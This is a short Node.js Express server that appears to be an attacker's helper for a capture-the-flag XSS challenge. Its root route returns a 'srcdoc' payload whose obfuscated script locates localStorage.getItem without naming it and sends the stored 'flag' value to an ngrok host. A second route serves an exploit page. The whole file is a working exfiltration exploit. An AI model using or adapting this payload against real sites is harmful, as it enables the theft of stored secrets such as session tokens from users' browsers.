const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();

const HOST = "http://b648-185-219-81-55.ngrok-free.app"; //change me
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/',(req,res) => {
    res.setHeader('Access-Control-Allow-Origin','*');
    console.log(req.query)
    res.json({'srcdoc': "<script>for(let a in window) if(a[0] =='l' && a[1] == 'o' && a[2] == 'c' && a.length == 12) {for(let c in window[a]) if(c[0] == 'g' && c.length == 7) fetch(`"+HOST+"/?answer=${window[a][c]('flag')}`,{'mode': 'no-cors'})}</script>"})
})

app.get('/exploit',(req,res) => {
    console.log("Exploit visited");
    res.sendFile(path.join(__dirname,"exploit.html"));
})

app.listen(5555, () => {
    console.log('Static server is running on http://localhost:5555');
});
